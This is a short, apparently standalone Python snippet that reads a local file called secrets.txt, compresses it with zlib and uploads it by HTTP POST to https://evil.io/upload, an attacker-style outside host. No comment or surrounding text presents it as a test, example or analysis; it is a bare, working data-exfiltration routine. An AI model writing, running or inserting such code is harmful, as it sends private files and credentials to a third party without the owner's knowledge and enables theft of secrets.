import zlib, urllib.request
url = 'https://evil.io/upload'
urllib.request.urlopen(url, data=zlib.compress(open('secrets.txt').read().encode()))
